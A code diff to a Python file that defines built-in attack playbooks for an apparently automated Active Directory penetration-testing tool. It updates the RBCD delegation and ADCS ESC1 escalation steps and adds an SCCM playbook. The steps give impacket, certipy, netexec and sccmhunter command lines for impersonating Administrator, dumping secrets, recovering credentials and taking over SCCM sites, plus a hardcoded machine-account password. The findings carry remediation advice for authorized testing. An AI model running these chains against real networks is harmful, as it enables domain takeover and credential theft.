@@ -32,7 +32,7 @@ from pathlib import Path
 
 
 # Bump when the built-in playbooks change so existing installs re-seed them.
-_BUILTIN_VERSION = 13
+_BUILTIN_VERSION = 14
 
 # Controlled vocabulary the step builder offers (free text is still allowed).
 # `domain`/`signing`/`host_info` are the reconnaissance variables an early
@@ -42,7 +42,7 @@ ARTIFACTS = [
     "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
     "adcs_vuln", "certificate", "mssql_exec", "delegation", "trust", "acl_write",
     "gpp", "zerologon_vuln", "nopac_vuln", "printnightmare_vuln", "ms17_vuln",
-    "weak_policy", "dpapi_secret", "pre2k_hit", "admin", "flag",
+    "weak_policy", "dpapi_secret", "pre2k_hit", "sccm", "admin", "flag",
 ]
 # Execution triggers the sequence runner understands (see sequence._trigger_ok).
 # A step fires when its trigger is true against the current variables.
@@ -272,18 +272,23 @@ DEFAULT_PLAYBOOKS = [
                          "RBCD and other delegation attacks.",
                   recommendation="Set ms-DS-MachineAccountQuota to 0 and delegate computer "
                          "creation to a dedicated group."),
-            _step(2, "Write delegation onto the target", "have credential",
-                  "rbcd (set delegate_to = target computer from BloodHound)",
-                  ["credential", "machine_account"], [],
-                  "impacket-rbcd -delegate-from ATTACK$ -delegate-to <TARGET$> -action write. "
-                  "Needs write over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity."),
-            _step(3, "S4U2Proxy ticket + use it", "have credential",
-                  "get_st (set spn + impersonate=Administrator)",
+            _step(2, "Find a computer you can write over", "have credential", "bloodyad",
+                  ["credential"], ["acl_write"],
+                  "bloodyAD get writable — list computer objects your account can write "
+                  "(GenericWrite/WriteDACL/GenericAll over a computer = an RBCD target). "
+                  "Pick one and set it as the `delegate_to` variable."),
+            _step(3, "Write RBCD delegation onto the target", "have credential", "rbcd",
+                  ["credential", "machine_account", "acl_write"], [],
+                  "impacket-rbcd auto-fills -delegate-from ATTACK$ and -action write; set the "
+                  "`delegate_to` variable to the target computer (e.g. SRV01$) from step 2.",
+                  args={"delegate_from": "ATTACK$"}),
+            _step(4, "S4U2Proxy ticket + use it", "have credential",
+                  "get_st (run as ATTACK$: -spn cifs/<target> -impersonate Administrator)",
                   ["machine_account"], ["ticket", "admin", "flag"],
-                  "impacket-getST -spn cifs/<target.fqdn> -impersonate Administrator → .ccache; "
-                  "then KRB5CCNAME=… secretsdump -k / psexec -k for admin on the target. "
-                  "This is the RBCD → Domain Admin escalation (Critical) once you have write "
-                  "over the target computer — run it manually with the values from BloodHound.",
+                  "impacket-getST as ATTACK$:Attack123! auto-fills -impersonate Administrator; "
+                  "set -spn cifs/<target.fqdn>. Then KRB5CCNAME=… secretsdump -k / psexec -k "
+                  "on the target. This is the RBCD → Domain Admin escalation (Critical); it "
+                  "runs as the created machine account, so provide those creds + the target SPN.",
                   "final"),
         ],
     },
@@ -390,14 +395,15 @@ DEFAULT_PLAYBOOKS = [
                          "domain compromise.",
                   recommendation="Remove enrollee-supplied-subject (ESC1), restrict "
                          "enrollment rights, enable manager approval, and audit templates."),
-            _step(2, "Enroll as a privileged user", "have credential",
-                  "certipy_req (set ca/template/upn from step 1)",
-                  ["adcs_vuln", "credential"], ["certificate"],
-                  "certipy req -ca <CA> -template <ESC1> -upn administrator@<domain> → .pfx."),
-            _step(3, "Authenticate with the certificate", "have credential",
-                  "certipy_auth (set pfx from step 2)", ["certificate"], ["credential", "hash"],
-                  "certipy auth -pfx administrator.pfx → NT hash + TGT for the target user.",
-                  "final"),
+            _step(2, "Enroll a certificate as Domain Admin", "have credential",
+                  "certipy_req", ["adcs_vuln", "credential"], ["certificate"],
+                  "certipy req: the CA + vulnerable template are auto-filled from step 1's "
+                  "output, and the UPN defaults to administrator@<domain> — enrols a cert "
+                  "impersonating a Domain Admin (ESC1) and saves the .pfx."),
+            _step(3, "Authenticate with the certificate → hash/TGT", "have credential",
+                  "certipy_auth", ["certificate"], ["credential", "hash"],
+                  "certipy auth: the .pfx is auto-filled from step 2 → recovers the target "
+                  "user's NT hash + a Kerberos TGT (Domain Admin).", "final"),
         ],
     },
     {
@@ -699,6 +705,45 @@ DEFAULT_PLAYBOOKS = [
         ],
     },
 
+    {
+        "id": "sccm-attack",
+        "name": "SCCM / MECM enumeration and abuse",
+        "summary": "Find SCCM (Configuration Manager) infrastructure in AD, then recover "
+                   "Network Access Account (NAA) credentials and take over the site — a "
+                   "common path to Domain Admin in enterprises.",
+        "match": {"any_ports": [389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Find SCCM infrastructure in AD", "have credential", "netexec_module",
+                  ["credential"], ["sccm"],
+                  "nxc ldap -M sccm: locate the SCCM Management Point / Site / Distribution "
+                  "servers published in Active Directory.",
+                  args={"protocol": "ldap", "module": "sccm"},
+                  severity="Medium", cvss="6.5",
+                  finding_title="SCCM / MECM Infrastructure Exposed",
+                  impact="SCCM is a high-value target: Network Access Account credentials, "
+                         "PXE boot media, and the admin service frequently lead to code "
+                         "execution across managed endpoints and to Domain Admin.",
+                  recommendation="Harden SCCM: enforce HTTPS/PKI + Enhanced HTTP, remove NAA "
+                         "where possible (use Enhanced HTTP), restrict site-server admins, "
+                         "and enable signing/encryption."),
+            _step(2, "Fingerprint distribution / site servers", "have credential",
+                  "netexec_module", ["sccm", "credential"], ["sccm"],
+                  "nxc smb -M sccm-recon6: confirm whether a host is a Distribution Point or "
+                  "Primary Site Server via the registry.",
+                  args={"protocol": "smb", "module": "sccm-recon6"}),
+            _step(3, "Recover NAA credentials", "have credential",
+                  "sccmhunter (find → smb/http NAA extraction)", ["sccm", "credential"],
+                  ["credential"],
+                  "sccmhunter find then smb/http: recover the Network Access Account "
+                  "credentials (often reused and privileged)."),
+            _step(4, "Site takeover → Domain Admin", "have credential",
+                  "sccmhunter admin (or ntlmrelayx to the site server)", ["credential"],
+                  ["admin", "flag"],
+                  "Relay a site-server coercion or abuse the admin service to add a full "
+                  "administrator and push code to every managed device.", "final"),
+        ],
+    },
     {
         "id": "unauth-ad-roast",
         "name": "Unauthenticated AD credential exposure (pre2k / timeroast)",
